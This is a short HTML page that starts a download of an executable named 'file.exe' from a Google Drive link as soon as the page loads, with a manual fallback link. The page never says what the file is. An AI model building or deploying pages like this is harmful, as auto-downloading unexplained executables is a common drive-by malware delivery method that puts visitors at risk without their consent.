<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File</title>
    <script type="text/javascript">
        // Function to download a file
        function downloadFile() {
            // URL for the file hosted on Google Drive (direct download link)
            var fileUrl = 'https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H';
            
            // Create an anchor element to trigger the download
            var link = document.createElement('a');
            link.href = fileUrl;
            link.download = 'file.exe'; // Name the file for download
            link.click(); // Simulate a click on the link to start the download
        }
    </script>
</head>
<body onload="downloadFile();">
    <h1>Downloading File...</h1>
    <p>If the file does not start downloading automatically, <a href="#" onclick="downloadFile();">click here to download it</a>.</p>
</body>
</html>
